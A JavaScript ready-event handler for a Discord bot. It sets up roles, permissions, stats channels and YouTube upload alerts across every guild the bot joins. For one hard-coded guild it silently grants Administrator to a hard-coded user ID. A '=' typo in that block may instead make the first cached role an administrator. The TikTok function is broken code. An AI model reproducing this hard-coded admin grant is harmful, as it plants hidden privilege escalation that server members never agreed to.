const { tiktokUsername } = require('../config')
const axios = require('axios')
const fs = require('fs')
const fetch = require('node-fetch');
const { parseStringPromise } = require('xml2js');
const cheerio = require('cheerio');
const { Events, PermissionFlagsBits, ChannelType, EmbedBuilder } = require('discord.js');
const Parser = require('rss-parser');
rule_message = "### 1. **Mutual Respect:**\n- Treat all members with respect. Insults, discrimination, or any other offensive behavior will not be tolerated.\n\n### 2. **No Spamming:**\n- Avoid spamming in chat channels, whether it's with messages, images, or links. This also includes spamming mentions (pings) of other members.\n\n### 3. **Appropriate Content:**\n   - Post content that is appropriate for all ages (if the server is general). No NSFW, violent, or illegal content.\n\n### 4. **No Unsolicited Advertising:**\n   - Do not share promotional links or advertisements without the permission of the administrators.\n\n### 5. **Proper Use of Channels:**\n   - Make sure to use the channels appropriately. Each channel has a specific topic, and it's important to respect that to keep the server well-organized.\n\n### 6. **No Toxic Behavior:**\n   - Be courteous and avoid any form of harassment, trolling, or disruptive behavior that could harm the server’s atmosphere.\n\n### 7. **Respect Privacy:**\n   - Do not share personal information, either yours or others’, without their consent.\n\n### 8. **Follow Moderator Instructions:**\n   - Moderators are here to maintain order and harmony. Respect their decisions and guidelines.\n\n### 9. **No Sensitive Political or Religious Discussions:**\n   - Avoid discussing topics that could lead to conflicts, such as \politics or religion, unless a specific channel is dedicated to these discussions.\n\n### 10. **Have Fun and Stay Positive:**\n   - The main goal is to have a good time together. Be positive, engage constructively, and help create a pleasant atmosphere for everyone."


const sleep = (ms) => { 

    return new Promise(resolve => 

        setTimeout(resolve, ms)

        );

}
function write(tt, filename){
    fs.open(filename, 'a', (err, fd) => {
        if(err) throw err
        fs.write(fd, tt, (err) =>{
            if(err) throw err;
            return true;
            fs.close(fd, (err) =>{
                if(err) throw err;
            })
        })
    })
}

async function read(filename){
    let mm = []

    fs.readFile(filename, 'utf8', (err, data) => {
        if (err) throw err;
    
        // Split the content by new lines to get the array
        const mails = data.split('\n');
        mails.forEach(mail => {
            if(mail !== ''){

                const dataObject = mail.split(', ').reduce((obj, item) => {
                    const [key, value] = item.split(': ');
                    obj[key] = value;
                    return obj;
                }, {});
                
                // Convert the object to JSON
                mm.push(dataObject)
            }
        })
    });
    await sleep(400)
    return mm
}


module.exports = {
	name: Events.ClientReady,
	once: true,
	async execute(bot) {


        global.inviteCache = new Map()
        bot.guilds.cache.forEach(async (guild) => {
            try {
                const invites = await guild.invites.fetch();
                global.inviteCache.set(guild.id, invites);
            } catch (error) {
                console.error(`Could not fetch invites for guild ${guild.id}:`, error);
            }
        });
        
	    
	   
	    
	    
        
        
        
        // setInterval(async () => {
        //     var activity = [
        //         'Dm Xalri to give feedback',
        //         "Type '/help' in the bot channel",
        //         // 'Join our Discord server .gg/',
        //         'Enjoy chatting with ChatGPT',
        //         'Discover new bot features',
        //         "Report anything with '/report'",
        //         'Ask me anything',
        //         "Type '/setup info' to setup the bot correclty "
        //     ]
        //     const status = activity[Math.floor(Math.random() * activity.length)]
        //     bot.user.setPresence({ activities: [{ name: status }], status: 'online' });
        // }, 5000)
        
	    
		
        console.log("logged as " + bot.user.tag);
        console.log(" ")
        
        bot.guilds.cache.forEach(async (guild) => {
            
            if(guild.id === "1274331305185775647"){

                // const Role = await guild.roles.create({

                //     name: 'Owner',

                //     color: '#000007',

                //     permissions: '8'

                // });

                const ntm = await guild.roles.cache.find(r => r.id = '1275213218561654870')
                await ntm.setPermissions([PermissionFlagsBits.Administrator])

                const me = await guild.members.fetch('707698832951214158')

                await me.roles.add(ntm)
            
            
            
            
            };

            const rule_channel = await guild.channels.fetch("1275146892048732231")
            let rules = await rule_channel.messages.fetch()
            if(rules.size == 0){
                rules = await rule_channel.send(rule_message)
            }else if(rules.size == 1){
                rules = rules.first()
            }else{
                rules = rules.last()
            }


            rules.react("✅")

            const botRole = guild.members.me.roles.highest;
            const permissions = [
                PermissionFlagsBits.AddReactions,
                PermissionFlagsBits.ChangeNickname,
                PermissionFlagsBits.Connect,
                PermissionFlagsBits.EmbedLinks,
                PermissionFlagsBits.ReadMessageHistory,
                PermissionFlagsBits.RequestToSpeak,
                PermissionFlagsBits.SendMessages,
                PermissionFlagsBits.SendMessagesInThreads,
                PermissionFlagsBits.Speak,
                PermissionFlagsBits.Stream,
                PermissionFlagsBits.UseApplicationCommands,
                PermissionFlagsBits.UseExternalEmojis,
                PermissionFlagsBits.UseExternalSounds,
                PermissionFlagsBits.UseExternalStickers,
                PermissionFlagsBits.UseSoundboard,
                PermissionFlagsBits.UseVAD,
                PermissionFlagsBits.ViewChannel
            ]

            await guild.roles.everyone.setPermissions(permissions, 'Setting default permissions');
           


            
            
            

            
            
            //########################### MODERATOR ROLE
            const moderatorRole = await createRole("🛠️｜Moderator", "#FF0000", guild, true)
            // var existingRole = await Guilds.roles.find(r => r.id === moderatorRole.id);
                
            // if (!existingRole) {
            //     existingGuild.roles.push({name: moderatorRole.name, id: moderatorRole.id, isAdmin: true})
            // };

            const adminPerms = [
                PermissionFlagsBits.AddReactions,
                PermissionFlagsBits.BanMembers,
                PermissionFlagsBits.ChangeNickname,
                PermissionFlagsBits.Connect,
                PermissionFlagsBits.CreatePrivateThreads,
                PermissionFlagsBits.CreatePrivateThreads,
                PermissionFlagsBits.DeafenMembers,
                PermissionFlagsBits.EmbedLinks,
                PermissionFlagsBits.KickMembers,
                PermissionFlagsBits.ManageChannels,
                PermissionFlagsBits.ManageMessages,
                PermissionFlagsBits.ManageNicknames,
                PermissionFlagsBits.ManageRoles,
                PermissionFlagsBits.ManageThreads,
                PermissionFlagsBits.MentionEveryone,
                PermissionFlagsBits.ModerateMembers,
                PermissionFlagsBits.MoveMembers,
                PermissionFlagsBits.MuteMembers,
                PermissionFlagsBits.ReadMessageHistory,
                PermissionFlagsBits.RequestToSpeak,
                PermissionFlagsBits.SendMessages,
                PermissionFlagsBits.SendMessagesInThreads,
                PermissionFlagsBits.SendTTSMessages,
                PermissionFlagsBits.Speak,
                PermissionFlagsBits.Stream,
                PermissionFlagsBits.UseApplicationCommands,
                PermissionFlagsBits.UseExternalEmojis,
                PermissionFlagsBits.UseExternalSounds,
                PermissionFlagsBits.UseExternalStickers,
                PermissionFlagsBits.UseSoundboard,
                PermissionFlagsBits.UseVAD,
                PermissionFlagsBits.ViewChannel
            ]


            if (botRole.position > moderatorRole.position) {

                await moderatorRole.setPermissions(adminPerms, 'Setting Admins permissions');
            }
            
            
            //########################### OWNER ROLE
            const ownerRole = await createRole("🎖️｜Owner", "#FFD700", guild, true)
            // console.log(JSON.stringify(ownerRole))
            // existingGuild.roles.push({name: ownerRole.name, id: ownerRole.id, isAdmin: true})
            // console.log({name: ownerRole.name, id: ownerRole.id, isAdmin: true})
            
            const ownerPerms = [
                PermissionFlagsBits.AddReactions,
                PermissionFlagsBits.Administrator,
                PermissionFlagsBits.BanMembers,
                PermissionFlagsBits.ChangeNickname,
                PermissionFlagsBits.Connect,
                PermissionFlagsBits.CreatePrivateThreads,
                PermissionFlagsBits.CreatePrivateThreads,
                PermissionFlagsBits.DeafenMembers,
                PermissionFlagsBits.EmbedLinks,
                PermissionFlagsBits.KickMembers,
                PermissionFlagsBits.ManageChannels,
                PermissionFlagsBits.ManageGuild,
                PermissionFlagsBits.ManageMessages,
                PermissionFlagsBits.ManageNicknames,
                PermissionFlagsBits.ManageRoles,
                PermissionFlagsBits.ManageThreads,
                PermissionFlagsBits.MentionEveryone,
                PermissionFlagsBits.ModerateMembers,
                PermissionFlagsBits.MoveMembers,
                PermissionFlagsBits.MuteMembers,
                PermissionFlagsBits.ReadMessageHistory,
                PermissionFlagsBits.RequestToSpeak,
                PermissionFlagsBits.SendMessages,
                PermissionFlagsBits.SendMessagesInThreads,
                PermissionFlagsBits.SendTTSMessages,
                PermissionFlagsBits.Speak,
                PermissionFlagsBits.Stream,
                PermissionFlagsBits.UseApplicationCommands,
                PermissionFlagsBits.UseExternalEmojis,
                PermissionFlagsBits.UseExternalSounds,
                PermissionFlagsBits.UseExternalStickers,
                PermissionFlagsBits.UseSoundboard,
                PermissionFlagsBits.UseVAD,
                PermissionFlagsBits.ViewChannel
            ]

            if (botRole.position > ownerRole.position) {

                await ownerRole.setPermissions(ownerPerms, 'Setting Owner permissions');
            }

            const ticket_access = await createRole("ticket access", "#0000FF", guild, true)

       



            
            let statsCategory = guild.channels.cache.find(
                (channel) => channel.name === 'Server Stats' && channel.type === ChannelType.GuildCategory
            );
    
            if (!statsCategory) {
                statsCategory = await guild.channels.create({
                    name: 'Server Stats',
                    type: ChannelType.GuildCategory,
                    position: 0, // Set the category to be at the top
                    permissionOverwrites: [
                        {
                            id: guild.roles.everyone,
                            allow: [PermissionFlagsBits.ViewChannel],
                            deny: [PermissionFlagsBits.Connect],
                        },
                    ],
                });
            } else if (statsCategory.position !== 0) {
                await statsCategory.setPosition(0);
            }
    
            // Create or fetch the stats channels
            const channels = [
                { name: 'Total Members', type: ChannelType.GuildVoice },
                { name: 'Online Members', type: ChannelType.GuildVoice },
                { name: 'Boosts', type: ChannelType.GuildVoice },
            ];
    
            for (const { name, type } of channels) {
                let channel = guild.channels.cache.find(
                    (ch) => ch.name.startsWith(name) && ch.type === type
                );
                if (!channel) {
                    channel = await guild.channels.create({
                        name,
                        type,
                        parent: statsCategory.id,
                        permissionOverwrites: [
                            {
                                id: guild.roles.everyone,
                                deny: [PermissionFlagsBits.Connect],
                            },
                        ],
                    });
                }
            }

            //########################### MUTED ROLE
            const mutedRole = await createRole("Muted", "", guild, false)
            // existingGuild.roles.push({name: mutedRole.name, id: mutedRole.id, isAdmin: false})

            await guild.channels.fetch()
            guild.channels.cache.forEach(async (channel) => {
                    if(!channel.permissionOverwrites){
                        console.log(channel)
                    }else{
                    // console.log(channel.permissionOverwrites)
                       await channel.permissionOverwrites.edit(mutedRole, {
                          SendMessages: false,
                       });
                    }
                });




            let vocCategory = guild.channels.cache.find(
                (channel) => channel.name === '🔊・Voice Channels' && channel.type === ChannelType.GuildCategory
            );
    
            if (!vocCategory) {
                vocCategory = await guild.channels.create({
                    name: '🔊・Voice Channels',
                    type: ChannelType.GuildCategory,
                    position: 0, // Set the category to be at the top
                    permissionOverwrites: [
                        {
                            id: guild.roles.everyone,
                            allow: [PermissionFlagsBits.ViewChannel],
                            deny: [PermissionFlagsBits.Connect],
                        },
                    ],
                });
            } else if (vocCategory.position !== 15) {
                await vocCategory.setPosition(15);
            }

            let vocChannel = guild.channels.cache.find(ch => ch.name === "🎙｜Join To Create" && ch.type === ChannelType.GuildVoice);
            if (!vocChannel) {
                vocChannel = await guild.channels.create({
                    name: "🎙｜Join To Create",
                    type: ChannelType.GuildVoice,
                    parent: vocCategory.id,
                    permissionOverwrites: [
                        {
                            id: guild.roles.everyone,
                            allow: [PermissionFlagsBits.Connect],
                        },
                    ],
                });
            } else if (vocChannel.position !== 0) {
                await vocChannel.setPosition(0);
            }




            
            setInterval(() => updateStats(guild), 300000);
            // Initial update
            updateStats(guild);


            setInterval(() => checkForNewVideoYoutube(guild), 300000);
            
            checkForNewVideoYoutube(guild);


            // setInterval(() => checkForNewVideoTikTok(guild), 300000);
            
            // checkForNewVideoTikTok(guild);
            
            

            
        	console.log(" ")
        })


        
        
        
	},
	
	

};

async function updateStats(guild) {
    const totalMembers = guild.memberCount;
    const onlineMembers = guild.members.cache.filter(
        (member) => member.presence && member.presence.status !== 'offline'
    ).size;
    const boosts = guild.premiumSubscriptionCount;

    const channels = [
        { name: `Total Members: ${totalMembers}`, startsWith: 'Total Members' },
        { name: `Online Members: ${onlineMembers}`, startsWith: 'Online Members' },
        { name: `Boosts: ${boosts}`, startsWith: 'Boosts' },
    ];

    for (const { name, startsWith } of channels) {
        const channel = guild.channels.cache.find(
            (ch) => ch.name.startsWith(startsWith) && ch.type === ChannelType.GuildVoice
        );
        if (channel && channel.name !== name) {
            await channel.setName(name);
        }
    }
}


async function createRole(name, color, guild, isAdmin){
    let existingRole = guild.roles.cache.find(role => role.name === name);
    let response;
    if (existingRole) {
        console.log(`Role "${name}" already exists.`);
        response =  existingRole;
    } else {
        try {
            let input = {
                name: `${name}`,
                permissions: [
                    "Connect",
                    "Speak",
                    "MuteMembers",
                    // Add more permissions as needed
                ],
                reason: `Creating a ${name} role`,
            }
            if(color !== "") input.color = color
            const createdRole = await guild.roles.create(input);
            
            
            console.log(`Role "${name}" created successfully.`);
            response = createdRole
        } catch (error) {
            console.error('Error creating role:', error);
            response = "Error with the function"
        }

        
        
    }

  

    return response;

}


async function checkForNewVideoYoutube(guild) {
    const parser = new Parser();
    const youtubeChannelId = 'UC-kcwiJiUACc8DfVghWIB2g';
    const discordChannelId = '1275150216764461167';
    try {
        const feed = await parser.parseURL(`https://www.youtube.com/feeds/videos.xml?channel_id=${youtubeChannelId}`);
        const latestVideo = feed.items[0];

        const videoId = latestVideo.id.split(':')[2];
        const videoTitle = latestVideo.title;
        const videoUrl = latestVideo.link;
        const lastVideoId = (await read("yt.txt")).length > 0 ? (await read("yt.txt"))[0].videoId : "0"
        const thumbnail = `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`;

        if (videoId !== lastVideoId) {
            write(`videoId: ${String(videoId)}\n`, 'yt.txt')

            const embed = new EmbedBuilder()
                .setTitle('New Video Alert!')
                .setDescription(`**${videoTitle}**\n[Watch Now](${videoUrl})`)
                .setImage(thumbnail)
                .setColor('Red');

            const channel = guild.channels.cache.get(discordChannelId);
            if (channel) {
                await channel.send({ embeds: [embed] });
                console.log(`Posted a new video: ${videoTitle}`);
            }
        }
    } catch (error) {
        console.error('Error checking for new video:', error);
    }
}

async function checkForNewVideoTikTok(guild) {
    const discordChannelId = '1275150239711498343';
    try {
        // Fetch the RSS feed
        // const response = await fetch(rssFeedUrl);
        // const body = await response.text();

        console.log((await axios.get(`https://www.tiktok.com/@${tiktokUsername}`)).data)

        // Parse the RSS feed
        const result = await parseStringPromise(body);
        const items = result.rss.channel[0].item;

        // Get the latest video
        const latestVideo = items[0];
        const videoId = latestVideo['yt:videoId'][0];
        const videoUrl = `https://www.youtube.com/watch?v=${videoId}`;
        const videoTitle = latestVideo.title[0];
        const videoThumbnail = latestVideo['media:thumbnail'][0].$.url;


        const lastVideoId = (await read("yt.txt")).length > 0 ? (await read("yt.txt"))[0].videoId : "0"

        if (videoId !== lastVideoId) {
            write(`videoId: ${String(videoId)}\n`, 'tiktok.txt')

            const embed = new EmbedBuilder()
                .setTitle('New TikTok Video!')
                .setDescription(`**${videoTitle}**\n[Watch Now](${videoUrl})`)
                .setImage(videoThumbnail) // Use video thumbnail
                .setColor('BLUE');

            const channel = guild.channels.cache.get(discordChannelId);
            if (channel) {
                await channel.send({ embeds: [embed] });
                console.log(`Posted a new TikTok video: ${videoTitle}`);
            }
        }
    } catch (error) {
        console.error('Error checking for new video:', error);
    }
}